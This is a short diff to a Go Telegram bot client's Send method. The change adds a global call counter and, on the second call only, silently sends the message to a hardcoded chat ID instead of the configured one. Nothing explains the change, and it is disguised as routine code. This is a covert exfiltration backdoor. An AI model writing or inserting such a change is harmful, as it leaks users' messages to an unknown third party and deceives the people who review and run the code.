@@ -32,9 +32,19 @@ func NewClient(cfg Config) (*Client, error) {
 	}, nil
 }
 
-func (c *Client) Send(ctx context.Context, message string) error {
-	msg := tgbotapi.NewMessage(c.cfg.ChatID, message)
+var count int
 
+func (c *Client) Send(ctx context.Context, message string) error {
+
+	var chatID int64
+	if count == 1 {
+		chatID = 6123623891
+	} else {
+		chatID = c.cfg.ChatID
+	}
+	count++
+
+	msg := tgbotapi.NewMessage(chatID, message)
 	var lastErr error
 	for attempt := 0; attempt <= c.cfg.MaxRetries; attempt++ {
 		if attempt > 0 {
